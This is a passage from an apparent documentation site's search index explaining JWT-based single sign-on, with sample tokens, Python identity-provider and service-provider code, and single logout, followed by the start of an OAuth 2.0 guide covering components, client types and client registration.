\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500&gt;\u2502\n     \u2502                    \u2502                       \u2502                     \u2502\n     \u2502                    \u2502                       \u2502  12. JWT already present\n     \u2502                    \u2502                       \u2502      Verify signature\n     \u2502                    \u2502                       \u2502      Check 'aud' includes \"app2\"\n     \u2502                    \u2502                       \u2502      \u2705 Valid      \u2502\n     \u2502                    \u2502                       \u2502                     \u2502\n     \u2502  13. Access granted (NO re-authentication!)\u2502                     \u2502\n     \u2502&lt;\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n     \u2502                    \u2502                       \u2502                     \u2502\n     \u2502  \u2705 Using App 2    \u2502                       \u2502                     \u2502\n     \u2502                    \u2502                       \u2502                     \u2502\n     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n     User authenticated ONCE, accessed TWO apps without re-login!\n</code></pre>"},{"location":"security/jwt/#jwt-structure-in-sso","title":"JWT Structure in SSO","text":"<pre><code>{\n  // Header\n  \"alg\": \"RS256\",\n  \"typ\": \"JWT\",\n  \"kid\": \"auth0-key-2024\"\n}\n{\n  // Payload\n  \"iss\": \"https://auth.example.com\",           // Identity Provider\n  \"sub\": \"user_12345\",                          // User ID\n  \"aud\": [                                      // Multiple audiences\n    \"https://gmail.example.com\",\n    \"https://drive.example.com\",\n    \"https://calendar.example.com\"\n  ],\n  \"exp\": 1735689600,                            // Expiration\n  \"iat\": 1735603200,                            // Issued at\n  \"email\": \"user@example.com\",\n  \"name\": \"John Doe\",\n  \"roles\": [\"user\", \"editor\"],\n\n  // SSO-specific claims\n  \"session_id\": \"sess_abc123\",                  // SSO session ID\n  \"auth_time\": 1735603200,                      // When user authenticated\n  \"amr\": [\"pwd\", \"mfa\"],                        // Auth methods: password + MFA\n  \"acr\": \"urn:mace:incommon:iap:silver\"        // Auth context class\n}\n</code></pre>"},{"location":"security/jwt/#sso-implementation-example","title":"SSO Implementation Example","text":"<pre><code># Identity Provider (IdP)\nclass SSOIdentityProvider:\n    \"\"\"SSO Identity Provider - Issues JWTs for multiple apps\"\"\"\n\n    def __init__(self, private_key, issuer_url):\n        self.private_key = private_key\n        self.issuer_url = issuer_url\n        self.registered_apps = {\n            'app1': {\n                'name': 'Gmail',\n                'audience': 'https://gmail.example.com',\n                'redirect_uri': 'https://gmail.example.com/callback'\n            },\n            'app2': {\n                'name': 'Drive',\n                'audience': 'https://drive.example.com',\n                'redirect_uri': 'https://drive.example.com/callback'\n            },\n            'app3': {\n                'name': 'Calendar',\n                'audience': 'https://calendar.example.com',\n                'redirect_uri': 'https://calendar.example.com/callback'\n            }\n        }\n\n    def authenticate_user(self, username, password):\n        \"\"\"Authenticate user and create SSO session\"\"\"\n        # Verify credentials (check database)\n        user = self.verify_credentials(username, password)\n        if not user:\n            return {'success': False, 'error': 'Invalid credentials'}\n\n        # Create SSO session\n        session_id = self.create_sso_session(user['id'])\n\n        # Create JWT with multiple audiences\n        jwt_token = self.create_sso_token(\n            user_id=user['id'],\n            email=user['email'],\n            name=user['name'],\n            roles=user['roles'],\n            session_id=session_id,\n            audiences=[app['audience'] for app in self.registered_apps.values()]\n        )\n\n        return {\n            'success': True,\n            'token': jwt_token,\n            'session_id': session_id,\n            'user': user\n        }\n\n    def create_sso_token(self, user_id, email, name, roles, session_id, audiences):\n        \"\"\"Create JWT for SSO with multiple audiences\"\"\"\n        now = datetime.utcnow()\n\n        payload = {\n            # Standard claims\n            'iss': self.issuer_url,\n            'sub': user_id,\n            'aud': audiences,  # Multiple apps can use this token\n            'exp': now + timedelta(hours=8),  # 8 hour SSO session\n            'iat': now,\n            'jti': f'sso_{session_id}_{int(time.time())}',\n\n            # User info\n            'email': email,\n            'name': name,\n            'roles': roles,\n\n            # SSO-specific\n            'session_id': session_id,\n            'auth_time': int(now.timestamp()),\n            'amr': ['pwd', 'mfa']  # Authentication methods\n        }\n\n        # Sign with private key\n        token = jwt.encode(\n            payload,\n            self.private_key,\n            algorithm='RS256',\n            headers={'kid': 'sso-key-2024'}\n        )\n\n        return token\n\n\n# Service Provider (Application)\nclass SSOServiceProvider:\n    \"\"\"Application that uses SSO for authentication\"\"\"\n\n    def __init__(self, app_name, audience, idp_public_key, idp_issuer):\n        self.app_name = app_name\n        self.audience = audience\n        self.idp_public_key = idp_public_key\n        self.idp_issuer = idp_issuer\n\n    def handle_sso_callback(self, token):\n        \"\"\"Handle callback from IdP with JWT token\"\"\"\n        try:\n            # Verify JWT\n            payload = jwt.decode(\n                token,\n                self.idp_public_key,\n                algorithms=['RS256'],\n                audience=self.audience,\n                issuer=self.idp_issuer,\n                options={\n                    'verify_signature': True,\n                    'verify_exp': True,\n                    'verify_aud': True,\n                    'verify_iss': True\n                }\n            )\n\n            # Check if this app is in the audience\n            audiences = payload.get('aud', [])\n            if isinstance(audiences, str):\n                audiences = [audiences]\n\n            if self.audience not in audiences:\n                return {'success': False, 'error': 'Token not intended for this app'}\n\n            # Create local session\n            user_session = {\n                'user_id': payload['sub'],\n                'email': payload['email'],\n                'name': payload['name'],\n                'roles': payload['roles'],\n                'sso_session_id': payload['session_id'],\n                'authenticated_at': payload['auth_time']\n            }\n\n            return {\n                'success': True,\n                'user': user_session\n            }\n\n        except jwt.ExpiredSignatureError:\n            return {'success': False, 'error': 'Token expired'}\n        except jwt.InvalidTokenError as e:\n            return {'success': False, 'error': f'Invalid token: {str(e)}'}\n\n\n# Example Usage\nprint(\"=\" * 60)\nprint(\"SSO Flow Example\")\nprint(\"=\" * 60)\n\n# 1. User authenticates with IdP\nidp = SSOIdentityProvider(\n    private_key=load_private_key(),\n    issuer_url='https://auth.example.com'\n)\n\nauth_result = idp.authenticate_user('john@example.com', 'password123')\nif auth_result['success']:\n    print(f\"\u2705 User authenticated\")\n    print(f\"SSO Token: {auth_result['token'][:50]}...\")\n    sso_token = auth_result['token']\n\n# 2. User accesses App 1 (Gmail)\napp1 = SSOServiceProvider(\n    app_name='Gmail',\n    audience='https://gmail.example.com',\n    idp_public_key=load_public_key(),\n    idp_issuer='https://auth.example.com'\n)\n\napp1_result = app1.handle_sso_callback(sso_token)\nif app1_result['success']:\n    print(f\"\\n\u2705 App 1 (Gmail) access granted\")\n    print(f\"User: {app1_result['user']['email']}\")\n\n# 3. User accesses App 2 (Drive) - Same token!\napp2 = SSOServiceProvider(\n    app_name='Drive',\n    audience='https://drive.example.com',\n    idp_public_key=load_public_key(),\n    idp_issuer='https://auth.example.com'\n)\n\napp2_result = app2.handle_sso_callback(sso_token)\nif app2_result['success']:\n    print(f\"\\n\u2705 App 2 (Drive) access granted\")\n    print(f\"User: {app2_result['user']['email']}\")\n    print(f\"No re-authentication needed! \ud83c\udf89\")\n</code></pre>"},{"location":"security/jwt/#sso-protocols-using-jwt","title":"SSO Protocols Using JWT","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              SSO Protocols with JWT                        \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                             \u2502\n\u2502  1. OpenID Connect (OIDC)                                  \u2502\n\u2502     \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                                  \u2502\n\u2502     \u2022 Built on OAuth 2.0                                   \u2502\n\u2502     \u2022 Uses JWT for ID tokens                               \u2502\n\u2502     \u2022 Most popular modern SSO                              \u2502\n\u2502     \u2022 Examples: Auth0, Okta, Google Sign-In               \u2502\n\u2502                                                             \u2502\n\u2502     Flow:                                                   \u2502\n\u2502     User \u2192 IdP \u2192 JWT ID Token \u2192 App                       \u2502\n\u2502                                                             \u2502\n\u2502     ID Token Structure:                                     \u2502\n\u2502     {                                                       \u2502\n\u2502       \"iss\": \"https://accounts.google.com\",                \u2502\n\u2502       \"aud\": \"your-app-client-id\",                         \u2502\n\u2502       \"sub\": \"110169484474386276334\",                      \u2502\n\u2502       \"email\": \"user@example.com\",                         \u2502\n\u2502       \"email_verified\": true,                              \u2502\n\u2502       \"name\": \"John Doe\",                                  \u2502\n\u2502       \"picture\": \"https://...\",                            \u2502\n\u2502       \"exp\": 1735689600                                    \u2502\n\u2502     }                                                       \u2502\n\u2502                                                             \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                             \u2502\n\u2502  2. SAML (Security Assertion Markup Language)              \u2502\n\u2502     \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500               \u2502\n\u2502     \u2022 XML-based (older standard)                           \u2502\n\u2502     \u2022 Enterprise SSO                                       \u2502\n\u2502     \u2022 Can use JWT in newer implementations                 \u2502\n\u2502     \u2022 Examples: Shibboleth, ADFS                           \u2502\n\u2502                                                             \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                             \u2502\n\u2502  3. OAuth 2.0 + JWT                                        \u2502\n\u2502     \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500                                      \u2502\n\u2502     \u2022 JWT as access token                                  \u2502\n\u2502     \u2022 API authorization                                    \u2502\n\u2502     \u2022 Examples: GitHub, GitLab                             \u2502\n\u2502                                                             \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"security/jwt/#sso-logout-single-logout","title":"SSO Logout (Single Logout)","text":"<pre><code>class SSOLogout:\n    \"\"\"Handle SSO logout across all applications\"\"\"\n\n    def __init__(self, idp_url):\n        self.idp_url = idp_url\n        self.active_sessions = {}\n\n    def logout(self, session_id, user_id):\n        \"\"\"\n        Single logout: Invalidate session across all apps\n        \"\"\"\n        # 1. Revoke SSO session at IdP\n        self.revoke_sso_session(session_id)\n\n        # 2. Get all apps user is logged into\n        apps = self.get_user_apps(session_id)\n\n        # 3. Send logout notification to all apps\n        for app in apps:\n            self.notify_app_logout(app, user_id)\n\n        # 4. Clear session\n        if session_id in self.active_sessions:\n            del self.active_sessions[session_id]\n\n        return {'success': True, 'apps_logged_out': len(apps)}\n\n    def notify_app_logout(self, app, user_id):\n        \"\"\"Send logout notification to application\"\"\"\n        # Apps listen for logout events via:\n        # - Backchannel logout (HTTP POST)\n        # - Front-channel logout (iframe)\n        # - Token revocation endpoint\n\n        logout_token = self.create_logout_token(user_id, app)\n\n        # POST to app's logout endpoint\n        requests.post(\n            app['logout_endpoint'],\n            json={'logout_token': logout_token}\n        )\n</code></pre>"},{"location":"security/jwt/#summary","title":"Summary","text":""},{"location":"security/jwt/#key-concepts","title":"Key Concepts:","text":"<ol> <li>JWT Structure:</li> <li>Header (algorithm + metadata)</li> <li>Payload (claims)</li> <li> <p>Signature (verification)</p> </li> <li> <p>Claims:</p> </li> <li>Registered: iss, sub, aud, exp, nbf, iat, jti</li> <li>Public: standardized claims</li> <li> <p>Private: custom application claims</p> </li> <li> <p>Signing:</p> </li> <li>Symmetric (HS256): Same key for sign/verify</li> <li> <p>Asymmetric (RS256): Private key signs, public key verifies</p> </li> <li> <p>Storage:</p> </li> <li>\ud83c\udfc6 Best: HttpOnly cookies (XSS protection)</li> <li>\u26a0\ufe0f Avoid: localStorage (vulnerable to XSS)</li> <li> <p>\u2705 High security: Memory storage (lost on refresh)</p> </li> <li> <p>Stateless vs Stateful:</p> </li> <li>Pure JWT: Stateless (no DB lookup, cannot revoke)</li> <li>Hybrid: Short-lived access + stateful refresh token</li> <li> <p>\ud83c\udfc6 Recommended: 15-min access + 7-day refresh</p> </li> <li> <p>JWS: Specification for signing JSON (JWT is a type of JWS)</p> </li> <li> <p>JWKS: Public key set for verifying JWTs (key rotation)</p> </li> <li> <p>SSO with JWT:</p> </li> <li>Single authentication for multiple apps</li> <li>JWT with multiple audiences</li> <li>OpenID Connect (OIDC) most common</li> <li> <p>Single logout support</p> </li> <li> <p>Security:</p> </li> <li>\u2705 Use strong secrets/keys</li> <li>\u2705 Short expiration times</li> <li>\u2705 Validate all claims</li> <li>\u2705 Use HTTPS</li> <li>\u2705 Store in HttpOnly cookies</li> <li>\u274c Never store sensitive data</li> <li>\u274c Never use \"none\" algorithm</li> </ol> <p>Best Practice Flow: - Access token: 15 minutes (HS256/RS256) - stateless - Refresh token: 7 days (stored server-side) - stateful - Store in HttpOnly cookies with Secure + SameSite flags - Rotate keys regularly - Implement token blacklist for critical revocation - Use SSO for multi-app environments</p>"},{"location":"security/oauth/","title":"Application security","text":""},{"location":"security/oauth/#youtube","title":"Youtube","text":"<ul> <li> <p>OAuth 2.0: Explained with API Request and Response Sample | High Level System Design</p> </li> <li> <p>Token vs Session Authentication | Authentication Explained!!!</p> </li> <li> <p>OAuth2 Can Be Hacked Without PKCE | PKCE Explained</p> </li> <li> <p>99% of Developers Don't Get OAuth</p> </li> </ul>"},{"location":"security/oauth/#udemy","title":"Udemy","text":"<ul> <li>The Nuts and Bolts of OAuth 2.0</li> <li>Advanced OAuth Security</li> <li>Enterprise OAuth 2.0 and OpenID Connect</li> </ul>"},{"location":"security/oauth/#theory","title":"Theory","text":""},{"location":"security/oauth/#what-is-oauth-20","title":"What is OAuth 2.0?","text":"<p>OAuth 2.0 is an authorization framework that enables third-party applications to obtain limited access to a user's resources on another service without exposing the user's credentials. It's the industry-standard protocol for authorization.</p> <p>Key Characteristics: - Authorization, not Authentication: OAuth 2.0 is designed for authorization (granting access to resources), not authentication (verifying identity) - Delegated Access: Allows users to grant applications access to their data on other services - Token-based: Uses access tokens instead of sharing passwords - Scopes: Defines granular permissions for what the application can access</p>"},{"location":"security/oauth/#oauth-20-components","title":"OAuth 2.0 Components","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                     OAuth 2.0 Architecture                   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Resource Owner  \u2502  (End User)\n\u2502   (User)         \u2502  - Owns the protected resources\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  - Grants access to client application\n         \u2502\n         \u2502 (1) Authorization Request\n         \u2502\n         \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         (2) Authorization Grant         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502     Client       \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502 Authorization    \u2502\n\u2502  (Application)   \u2502                                          \u2502     Server       \u2502\n\u2502                  \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502                  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         (3) Access Token                \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n         \u2502                                                     - Authenticates user\n         \u2502                                                     - Issues tokens\n         \u2502                                                     - Validates scopes\n         \u2502\n         \u2502 (4) Access Token\n         \u2502\n         \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   Resource       \u2502\n\u2502    Server        \u2502\n\u2502   (API Server)   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n- Hosts protected resources\n- Validates access tokens\n- Serves protected data\n</code></pre> <p>Components Explained:</p> <ol> <li>Resource Owner (User)</li> <li>The entity that owns the protected resources</li> <li>Typically an end-user who can grant access to their data</li> <li> <p>Example: A user with photos on Google Photos</p> </li> <li> <p>Client (Application)</p> </li> <li>The application requesting access to protected resources</li> <li>Must be registered with the authorization server</li> <li>Has a client ID and optionally a client secret</li> <li>Types: Public clients (mobile/SPA) and Confidential clients (server-side)</li> <li> <p>Example: A photo printing service requesting access to Google Photos</p> </li> <li> <p>Authorization Server</p> </li> <li>Issues access tokens after authenticating the resource owner</li> <li>Validates client credentials</li> <li>Manages consent and scopes</li> <li> <p>Example: Google's OAuth 2.0 server, Auth0, Okta</p> </li> <li> <p>Resource Server (API Server)</p> </li> <li>Hosts the protected resources</li> <li>Validates access tokens before serving requests</li> <li>Often the same as the authorization server in simple setups</li> <li>Example: Google Photos API</li> </ol>"},{"location":"security/oauth/#client-registration-process","title":"Client Registration Process","text":"<p>Before a client application can use OAuth 2.0, it must be registered with the Authorization Server. This registration process establishes trust and provides the client with credentials needed for authentication.</p>"},{"location":"security/oauth/#why-client-registration-is-required","title":"Why Client Registration is Required","text":"<ul> <li>Identify the Application: Each client gets a unique identifier (<code>client_id</code>)</li> <li>Security: Confidential clients receive a <code>client_secret</code> for authentication</li> <li>Validate Redirects: Authorization server maintains allowed redirect URIs to prevent attacks</li> <li>Configure Permissions: Define what scopes/permissions the client can request</li> <li>Track Usage: Monitor and audit client application activity</li> </ul>"},{"location":"security/oauth/#client-types","title":"Client Types","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                     Client Types                             \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n1. CONFIDENTIAL CLIENTS\n   \u251c\u2500 Can securely store credentials\n   \u251c\u2500 Have both client_id AND client_secret\n   \u251c\u2500 Run on secure servers\n   \u2514\u2500 Examples:\n      \u251c\u2500 Server-side web applications (Node.js, Django, Spring)\n      \u251c\u2500 Backend services\n      \u2514\u2500 Microservices\n\n2. PUBLIC CLIENTS\n   \u251c\u2500 Cannot securely store secrets\n   \u251c\u2500 Have only client_id (NO client_secret)\n   \u251c\u2500 Code is accessible to users\n   \u2514\u2500 Examples:\n      \u251c\u2500 Single Page Applications (React, Vue, Angular)\n      \u251c\u2500 Mobile apps (iOS, Android)\n      \u251c\u2500 Desktop applications\n      \u2514\u2500 Browser-based apps\n</code></pre>"},{"location":"security/oauth/#registration-process","title":"Registration Process","text":"<p>Manual Registration (Most Common):</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                                  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   Developer      \u2502                                  \u2502  Authorization   \u2502\n\u2502                  \u2502                                  \u2502     Server       \u2502\n\u2502                  \u2502                                  \u2502  (e.g., Google,  \u2502\n\u2502                  \u2502                                  \u2502   Auth0, Okta)   \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                                  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502                                                         \u2502\n     \u2502 (1) Navigate to Developer Console/Portal               \u2502\n     \u2502     (e.g., console.cloud.google.com)                   \u2502\n     \u2502                                                         \u2502\n     \u2502 (2) Fill Registration Form:                            \u2502\n     \u2502     - Application Name                                 \u2502\n     \u2502     - Application Type (Web, SPA, Mobile, etc.)        \u2502\n     \u2502     - Redirect URIs                                    \u2502\n     \u2502     - Allowed Scopes                                   \u2502\n     \u2502     - Application Logo &amp; Description                   \u2502\n     \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6  \u2502\n     \u2502                                                         \u2502\n     \u2502                                                         \u2502 (3) Validate Input\n     \u2502                                                         \u2502     - Check redirect URIs\n     \u2502                                                         \u2502     - Verify application details\n     \u2502                                                         \u2502\n     \u2502 (4) Return Client Credentials:                         \u2502\n     \u2502     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n     \u2502     \u2502 client_id: abc123xyz456                \u2502         \u2502\n     \u2502     \u2502 client_secret: secret_abc123 (if conf.)|         \u2502\n     \u2502     \u2502 redirect_uris: [...]                   \u2502         \u2502\n     \u2502     \u2502 allowed_scopes: [...]                  \u2502         \u2502\n     \u2502     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n     \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502\n     \u2502                                                         \u2502\n     \u2502 (5) Store credentials securely                         \u2502\n     \u2502                                                         \u2502\n     \u25bc                                                         \u25bc\n</code></pre> <p>Dynamic Client Registration (RFC 7591):</p> <p>For automated registration via API:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                                  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   Client App     \u2502                                  \u2502  Authorization   \u2502\n\u2502                  \u2502                                  \u2502     Server       \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                                  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502                                                         \u2502\n     \u2502 POST /register                                         \u2502\n     \u2502 Content-Type: application/json                         \u2502\n     \u2502                                                         \u2502\n     \u2502 {                                                       \u2502\n     \u2502   \"redirect_uris\": [                                   \u2502\n     \u2502     \"https://client.example.com/callback\"              \u2502\n     \u2502   ],                                                    \u2502\n     \u2502   \"client_name\": \"My Application\",                     \u2502\n     \u2502   \"token_endpoint_auth_method\": \"client_secret_basic\", \u2502\n     \u2502   \"grant_types\": [\"authorization_code\", \"refresh\"],    \u2502\n     \u2502   \"response_types\": [\"code\"],                          